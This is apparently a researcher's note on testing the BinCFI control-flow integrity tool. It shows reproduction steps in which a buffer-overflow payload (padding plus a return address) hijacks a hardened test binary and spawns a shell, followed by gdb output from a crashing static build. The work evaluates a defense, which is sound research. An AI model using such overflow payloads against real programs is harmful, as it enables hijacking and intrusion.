- We tried to experiment with BinCFI.
But failed because an exploit works :(

How to reproduce
- compile vuln in test directory
- copy it to given virtualbox (http://www.seclab.cs.sunysb.edu/seclab/psi/psi-vbox-v1.0.tar.gz)
- /home/mingwei/cfi/modify_elf.py ./vuln
- ./target_elf/vuln/vuln_final `python -c'print"A"*268 + "\xca\x84\x04\x08"'`
GIVE ME INPUT
$ echo 'PWNED!!'
PWNED!!

- Static compiled binary with CFI is crashed!

(gdb) r
Starting program: /home/mingwei/cfi/python_rw/target_elf/vuln/vuln_final 

Program received signal SIGSEGV, Segmentation fault.
0x03000000 in ?? ()
(gdb) x/i $pc
=> 0x3000000: Cannot access memory at address 0x3000000

- I installed BinCFI in VM.
In given cfi-1.1.tar.gz, it has no modify_ldt directory.
Even though the folder doesn't exist, modifying elf seems work.
However, the result was same. The exploit works.
